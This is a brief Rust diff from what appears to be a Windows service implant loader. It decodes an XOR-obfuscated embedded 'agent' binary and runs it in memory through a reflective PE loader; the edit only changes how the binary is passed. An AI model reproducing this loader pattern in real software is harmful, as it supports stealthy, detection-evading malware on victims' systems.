@@ -55,7 +55,7 @@ fn service_main(_arguments: Vec<std::ffi::OsString>) {
 
 #[allow(static_mut_refs)]
 unsafe fn load() {
-    rspe::reflective_loader(common::unpack_to_vec(&AGENT_BIN, XOR_KEY));
+    rspe::reflective_loader(common::unpack_to_vec(AGENT_BIN, XOR_KEY));
 }
 
 // TODO Fix bug: two processes are created instead of one
